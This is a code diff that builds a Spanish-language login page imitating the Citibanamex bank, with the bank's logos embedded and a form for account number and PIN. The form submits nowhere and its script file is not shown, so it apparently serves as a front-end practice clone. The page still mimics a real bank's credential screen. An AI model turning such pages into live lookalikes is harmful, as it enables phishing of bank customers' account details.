@@ -1,15 +1,97 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet"
-        integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
-    <title>Banco</title>
+    <title>Banamex</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+
+
+    <style>
+        body{
+            background: white;
+            background: linear-gradient(to left,white,white );
+        }
+        .bg{
+            background-image: url(data:image/png;base64,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);
+            background-position: center center;
+            background-repeat: no-repeat;
+            background-size: 450px;
+        }
+    </style>
 </head>
 <body>
-    
+    <div class="container ">
+        <div class="row">
+            <div class="col bg">
+
+            </div>
+            <div class="col">
+                <div class="text-end">
+                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAATsAAACgCAMAAABE1DvBAAAAn1BMVEX/////V1n/UlT/UFL/iIn/nZ7d3d3U1NPZ2dnAwMDOzs7i4uL7+/vr6+u9vb2vr67z8/P/9vb/4uL/Rkjc5OTQ0NCoqKjGxsbp6enw8PCampnyjI2kpKSysrGVlZTX3t73e3yDg4J5eXhYWFePj4//pKXO1ta4wcFiYmFNTUxycnJGRkWHh4Z0dHO1vbyNlpX/lpfofn//7Oz/PUDyc3U9+ID3AAAGEUlEQVR4nO2dC3PUNhSFb2kryXpZlJUlGXs3gZAATZ/0//+2Xtm7KdDQBM9Qs/h88VhHr0R7RrYlx9YSAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1iBSaYJtWY1Ckyhrt+cMcI7SSK8DvaQXIqg3nNS93dPPnm4TibB2875iAl1qev2C+oGawF3PBXYrG0GtpqFnP5NHB7wPQy8v6W0k6e7PDzTSW0P5ltD9PsDSG08vHi4XrH5NwxXcuyP88gtdxceWtuIl5f5LtueseD1+Xk8K/vILtWQL4JoBAADgiJfGrt2GM8EVY2ykdJcgeRo2K9PkFBJdYlj8KUxsXEPDnUGtN/KY46zmkUmEd49FkRBrt+FckWs34IxRazfgXNFSeSVh3+cjdZ5CrczKLflKUTONkP/C62YKR+X/laeauZ5eu/0rErxglJBTWNX7wT1J6v3yHD76pt+3hwuNismlYLzQ2nhqlKzRxD3LJqOj8HRfTiw1GpLb8MnQ2UHpMfTW9KbxeU/HaKfVQL0bk+hp/2FOlJyjwiBjZ/uyYe9Cm5o2jWPqmzSk1DVzbKgx3yU/TrFUY5zhU+unmB67GhtSs13v7L4/0VX6oVLVcKdqYnfM5uRZdXf1tmteOc1OjxOvPTOrfr+/Oqn+dr6X0u37y+O99vxhvS3i2IpmYGdE8po3tkJon3jjMZ2IPvEm6h0C30TvneXZbS2XHGenWm+73a56J5qOR2niONC7G/GJqqQSR6WqyoF4WFKSytlQ5pPh1r1jL3jCL676dt93td91/b7tr6riYJzV2N/6/tKxd7q/HVkZUiXFzXvHR+HkgXHTbRNW9YhUU+SoeCusTKhpgZVl7071tkr1jo9X9iB0Ngyzd0OwXZi8G4ptw+Rdl21XJu9iotGwd8d6a3+C9eDr7OFwc011zz+HQ1WHdJ1mtZsSJ/Xr4ddDtnTY0W+u29ndqd7an+AL8fT3Hx+CSzx/9eo57488rF798fwPDk71HvwLf65twyKevvv+ETyZtyP/qWrpJ9/P4lTvoV//7qe1bVjE02ffrc8zeLcYeLcceLcceLcceLcceLcceLcceLcceLcceLcceLcceLcceLcceLcceLecc/Xu3ZP1OVfvLn54iIu6XUzleD+Xn8Qx6eKHvyZ5cVfsn/JT+OCfuDjPe+6PIFzvbuhwvWOuHaXdJA50s7ue0nYHe8OR3e6mFjtMSScx17te+xOsR+nHjkRqmcbRWMM2CerGYWAlhAoNXbHaj3sSpuZWoWo419vwg58u6vqUkzemqQ85JWOMr0JHyXL2ztdE0XOxlpWqYjTmWG/D7xAUH0eyKWodG2s9hzomS74+u6O1MIK9a6OObWytjVN2R1bX8t7Weht+ZraMTeN9M3EKJzHWiG+87lTHqvso+y7ccL8DAAAAAPgqyKYoivWhTWtyKVSf4FTFibrQTn0qNltJJmTHKdNDstYFQcHk7DheqC6BZ0rhTCutcIVLl+KcKVwykvjECmbfCDGLhjpqS8uzAxdFYpGESkTetjyhSCaGRqasUl1zMUWlDRulpWmptY0lnr/qUjPZ3CRF6SnxvKzJYgypaIyUwWdQV1e0YVoeK1iy06s7bkqqYSFn5ww3xaguMzgX2fSaFbIh1yk+FlWMZaDeNppifbHTdUGlwBN/T97pmpE4QzorpW+ktH1SRVi94VtQZLk3cX8q2QZXFcNXBltfR+H+lzmmuJMdM/iyUq8grOrOciRjzZ57gS2PJRmduSMFPgj7MFofjTFD7WbShUh2FMkZZawmbZN6b80jwCc+ZxzlnPlUJ6ziAziLIusqvTy048OXB3CljvGiFbmoLb/pDgAAAABwZnQ0KtnS8PGsolVyuneFUfGnuaT9XvThytS1Ak5wei9ue868HdZu4FdMneyzWfmjZCsDOUz+AQDfBuHjc9x78ImOAr6x4pMMmUZKkRRfSkcy9Ttlwj7Q9NU8VwOLQn39uiNvyGOk8iFyur9eSPKFVtZ9XUKLpgc7lYmUp80EUpb0pv/HAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADA/8ff8S6H8oJbJQMAAAAASUVORK5CYII=" width="50" alt="">
+                </div>
+                <h2 class="fw text-center py-5 color-primary"><em>CITIBANAMEX</em></h2>
+
+
+                <form action="#">
+                
+                    <div class="mb-4 justify-content">
+                        <label for="text" class="form-label"> Numero de cuenta</label>
+
+                        <input type="text" class="form-cont" name="text">
+                    </div>
+                    <div class="mb-4 aling-items-center">
+                        <label for="password" class="form-label"> NIP</label>
+
+
+                        <input type="password" class="form-cont" name="password">
+                    </div>
+                
+                    <div class="mb-4 form-check">
+                        <label for="connected" class="form-check-label"> Recordar datos</label>
+                        <input type="checkbox" class="form-check-input" name="connected">
+                    </div>
+                    <div class="d-grid">
+                        <button type="submit" class="btn btn-primary">Ir a mi Cuenta</button>
+                    </div>
+                    <div class="my-3">
+                        <span>¿No tienes cuenta?<a href="#"> Registrate</a></span> <br>
+                        <span><a href="#"> Recuperar NIP</a></span>
+                    </div>
+                </form>
+                   <div class="container w-100 my-5">
+                       <div class="row text-center">
+                           <div class="col-12 ">Iniciar sesion</div>
+                       </div>
+                       <div class="row">
+                           <div class="col">
+                              <button class="btn btn-outline-primary w_100 my_1">
+                                 <div class="row aling-items-center">
+                                     
+                                         <div class="col-10 fw-bold text-center">
+                                             Facebook
+                                         </div>
+                                 </div>
+                              </button>
+                           </div>
+                           <div class="col">
+                            <button class="btn btn-outline-danger w_100 my_1">
+                                <div class="row aling-items-center">
+                                    
+                                        <div class="col-10 fw-bold text-center">
+                                            Gmail
+                                        </div>
+                                </div>
+                             </button>
+                          </div>
+                           </div>
+                       </div>
+                   </div>
+                </div>
+            </div>
+        </div>
+    </div>
 </body>
 <script src="./app.js"></script>
 </html>
